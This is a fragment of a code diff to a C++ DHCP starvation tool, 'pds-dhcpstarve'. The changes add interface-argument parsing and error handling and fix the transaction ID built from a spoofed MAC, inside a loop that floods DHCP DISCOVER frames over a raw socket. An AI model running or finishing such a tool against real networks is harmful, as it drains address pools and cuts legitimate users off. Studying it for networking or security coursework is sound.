@@ -15,7 +15,16 @@ int socket_handle = -1;
 
 using namespace std;
 
-int main(int argc, char const *argv[]) {
+int main(int argc, char **argv) {
+    char *iface = nullptr;
+    if (argc == 3 && strcmp(argv[1], "-i") == 0)
+        iface = argv[2];
+    else {
+        cerr << "Bad arguments" << endl;
+        cout << "Usage" << endl
+             << "./pds-dhcpstarve -i <interface>" << endl;
+        return EXIT_FAILURE;
+    }
     srand(time(nullptr));
 
     uint8_t mac[6] = {};
@@ -41,9 +50,11 @@ int main(int argc, char const *argv[]) {
 
     // Get index of interface
     memset(&if_idx, 0, sizeof(struct ifreq));
-    strncpy(if_idx.ifr_name, argv[1], IFNAMSIZ-1);
-    if (ioctl(socket_handle, SIOCGIFINDEX, &if_idx) < 0)
-         cerr << "err SIOCGIFINDEX" << endl;
+    strncpy(if_idx.ifr_name, iface, IFNAMSIZ-1);
+    if (ioctl(socket_handle, SIOCGIFINDEX, &if_idx) < 0) {
+         cerr << "ERROR: SIOCGIFINDEX" << endl;
+         return EXIT_FAILURE;
+     }
 
     // set sockaddr_ll struct
     sa.sll_family = AF_PACKET;
@@ -107,7 +118,7 @@ int main(int argc, char const *argv[]) {
         memcpy(eh->ether_shost, mac, ETHER_ADDR_LEN);
         memcpy(dhcp->chaddr, mac, ETHER_ADDR_LEN);
         // new xid
-        dhcp->xid = (uint32_t) mac;
+        memcpy(&(dhcp->xid), mac, 4);
         // send
         if (sendto(socket_handle, frame, len, 0, (sockaddr *)&sa, sizeof(struct sockaddr_ll)) < 0)
             cerr << "ERROR: sendto DISCOVER -> continue it's an attack" << endl;
